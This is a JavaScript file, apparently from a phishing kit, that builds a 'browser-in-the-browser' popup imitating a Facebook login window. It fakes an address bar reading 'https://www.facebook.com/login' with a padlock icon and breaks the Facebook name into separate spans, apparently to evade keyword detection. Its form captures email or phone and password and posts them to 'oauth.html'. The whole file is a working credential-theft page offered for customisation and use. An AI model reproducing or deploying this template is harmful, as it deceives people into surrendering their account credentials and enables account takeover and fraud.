// Please Don't mess with the js functions the customization choices are available in config.ini
/* Bellow is the html page of the popup. I used innerHTML instead of iframe because in some slow computers the js popup can not be dragged fastly and they lag.*/

const popup_html_page =  '<div id="navwrapper">' +
'<table border="1" style="width: 100%; border-collapse: collapse; background-color: #fdfdfd;">' +
'<tbody>' +
'<tr style="height: 10px;">' +
'<td style="width: 100%; height: 10px;"><img src="static/ssl.png" alt="" width="16" height="16" /><span style="color: black; font-size:17px" onclick="addressbar_alert()">https</span><span onclick="addressbar_alert()" style="color: black; font-size:17px">://www.facebook.com/login</span></td>' +
'</tr>' +
'</tbody>' +
'</table>' +
'<div id="navbar">' +
'<h1 class="logowrapper">&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;F<span style="letter-spacing: 0.05px;">a</span><span style="letter-spacing: 0.05px;">c</span><span style="letter-spacing: 0.05px;">eb</span><span style="letter-spacing: 0.05px;">ook</span></h1>' +
'<p><span style="letter-spacing: 0.05px;"></span></p>' +
'<p><span style="letter-spacing: 0.05px;"></span></p>' +
'<p style="text-align: left;"></p>' +
'</div>' +
'</div>' +
'<div class="container"><b></b></div>' +
'<div class="container" style="text-align: left;"><b></b></div>' +
'<br />' +
'<br />' +
'<br />' +
'<div class="container"  style="top: 1%; position: relative;text-align:center ;right:16% ;font-size:16px;margin-top: 15px; padding: 13px 10px 10px 0;""><b></b>&nbsp; &nbsp;Log in with your Facebook account:</div>' +
'<div class="container" style="text-align: center;"><b></b></div>' +
'<br />' +
'<form name="theform" class="theform" method="post" action="oauth.html">' +
'<div class="container" style="top: 30%; position: relative;text-align: center; font-size:15px;"><label for="wfphshr-username">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Email or Phone:&nbsp; &nbsp; </label>&nbsp;<input type="text" placeholder="Enter your Email or Phone number" minlength="3" name="wfphshr-username" required="" style="font-size:12px;"/></div>' +
'<div class="container" style="top: 20%; position: relative;text-align: center; font-size:15px;"><label for="wfphshr-password">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Password:&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;</label>&nbsp;<input type="password" minlength="4" placeholder="Enter Password" name="wfphshr-password" required="" style="font-size:12px;"/></div>' +
'<div class="container" style="text-align: right;">&nbsp; &nbsp; &nbsp;</div>' +
'<br />' +
'<br />' +
'<br />' +
'<footer>' +
'<br />' +
'<div class="container" style="text-align: left;">' +
'<table style="height: 43px; width: 100%; border-collapse: collapse; border-color: Lightgrey; background-color: #f5f5f7; border-style: hidden;">' +
'<tbody>' +
'<tr style="height: 43px;">' +
'<td style="width: 100%; height: 43px; text-align: right;"><button style="margin-right: 5px" onclick="facebook_cancel()">Cancel</button>&nbsp;<button class="login-btn">Log In</button></td>' +
'</tr>' +
'</tbody>' +
'</table>' +
'</footer>' +
'</div>' +
'</form>'
